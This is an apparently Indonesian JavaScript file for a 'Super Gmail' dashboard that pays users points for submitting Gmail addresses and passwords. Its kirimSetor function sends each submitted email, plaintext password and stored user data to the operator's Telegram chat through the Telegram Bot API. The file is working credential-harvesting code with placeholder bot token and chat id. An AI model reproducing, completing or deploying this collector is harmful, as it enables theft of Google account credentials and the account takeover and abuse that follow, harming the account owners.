const sidebar = document.getElementById("sidebar");
const toggleBtn = document.getElementById("toggleSidebar");
const content = document.getElementById("content");

toggleBtn.addEventListener("click", () => {
  sidebar.classList.toggle("-translate-x-full");
});

// Load halaman dinamis
document.querySelectorAll(".menu-btn").forEach(btn => {
  btn.addEventListener("click", (e) => {
    const page = e.target.dataset.page;
    loadPage(page);
    sidebar.classList.add("-translate-x-full");
  });
});

function loadPage(page) {
  switch (page) {
    case "contact":
      content.innerHTML = `<h2 class="text-2xl mb-2">Contact Owner</h2><p>Hubungi admin via Telegram: <b>@owner_telegram</b></p>`;
      break;
    case "saldo":
      content.innerHTML = `<h2 class="text-2xl mb-2">Saldo</h2><p>Saldo Anda: <b>0 Poin</b></p>`;
      break;
    case "leaderboard":
      content.innerHTML = `<h2 class="text-2xl mb-2">Leaderboard</h2><p>Fitur coming soon!</p>`;
      break;
    case "job":
      content.innerHTML = `
      <h2 class="text-2xl mb-2">Job Gmail</h2>
      <div class="grid grid-cols-2 gap-4 mb-4">
        <div class="bg-gray-800 p-4 rounded">Total User: <b>0</b></div>
        <div class="bg-gray-800 p-4 rounded">Total Gmail: <b>0</b></div>
        <div class="bg-gray-800 p-4 rounded">Email/Public: <b>0</b></div>
        <div class="bg-gray-800 p-4 rounded">Point/Email: <b>100</b></div>
      </div>
      <div class="bg-gray-800 p-4 rounded">
        <h3 class="text-lg mb-2 font-semibold">Setor Gmail</h3>
        <input id="gmail" placeholder="Gmail" class="w-full mb-2 p-2 bg-gray-700 rounded">
        <input id="password" type="password" placeholder="Password" class="w-full mb-2 p-2 bg-gray-700 rounded">
        <div class="flex gap-2">
          <button id="btnSetor" class="bg-green-600 hover:bg-green-700 px-4 py-2 rounded">Setor</button>
          <button class="bg-red-600 hover:bg-red-700 px-4 py-2 rounded" onclick="loadPage('home')">Batal</button>
        </div>
      </div>`;
      document.getElementById("btnSetor").addEventListener("click", kirimSetor);
      break;
    default:
      content.innerHTML = `<h1 class="text-3xl font-bold mb-4">Selamat Datang di Super Gmail</h1>`;
  }
}

// Kirim data Gmail ke Telegram owner
async function kirimSetor() {
  const gmail = document.getElementById("gmail").value;
  const pass = document.getElementById("password").value;
  if (!gmail || !pass) return alert("Isi semua kolom!");

  const botToken = "YOUR_TELEGRAM_BOT_TOKEN";
  const chatId = "OWNER_CHAT_ID";
  const message = `📩 *Setor Gmail Baru!*\n\n👤 User: ${localStorage.getItem("userData")}\n📧 Gmail: ${gmail}\n🔑 Pass: ${pass}`;
  
  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
  });
  alert("Data sudah dikirim ke owner!");
}